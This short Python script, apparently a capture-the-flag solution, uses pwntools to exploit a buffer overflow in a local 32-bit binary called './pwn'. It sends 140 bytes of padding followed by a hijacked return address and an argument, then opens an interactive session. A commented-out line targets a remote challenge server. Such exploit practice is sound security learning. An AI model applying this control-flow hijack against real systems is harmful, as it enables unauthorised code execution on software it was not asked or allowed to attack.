from pwn import *

# io = remote('111.200.241.244', 59460)
io = process('./pwn')
io.recv()
payload = b'A' * 140 + p32(0x804849e) + p32(0x804a024)
io.send(payload)
io.interactive()